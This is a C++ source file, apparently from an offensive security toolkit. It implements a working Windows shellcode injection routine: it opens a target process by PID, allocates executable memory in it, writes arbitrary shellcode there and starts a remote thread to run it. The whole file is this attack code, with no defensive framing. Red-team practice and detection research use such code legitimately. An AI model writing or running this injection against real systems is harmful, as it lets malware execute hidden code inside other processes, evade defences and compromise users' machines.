#include "core/technique.hpp"

namespace Technique::Injection
{
    BOOL ShellcodeInjection(DWORD dwPid, const std::vector<BYTE>& shellcode)
    {
        HANDLE hProcess;
        HANDLE hThread;
        PVOID remoteBuffer;
        BOOL bResults;

        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
        if (!hProcess)
        {
            return FALSE;
        }

        remoteBuffer = VirtualAllocEx(
            hProcess,
            NULL,
            shellcode.size(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (!remoteBuffer)
        {
            CloseHandle(hProcess);
            return FALSE;
        }

        if (!WriteProcessMemory(
            hProcess,
            remoteBuffer,
            shellcode.data(),
            shellcode.size(),
            NULL
        )) {
            VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return FALSE;
        }

        hThread = CreateRemoteThreadEx(
            hProcess,
            NULL,
            0,
            (LPTHREAD_START_ROUTINE)remoteBuffer,
            NULL,
            0,
            NULL,
            NULL
        );
        if (!hThread)
        {
            VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return FALSE;
        }

        WaitForSingleObject(hThread, INFINITE);

        CloseHandle(hProcess);
        CloseHandle(hThread);

        return TRUE;
    }
}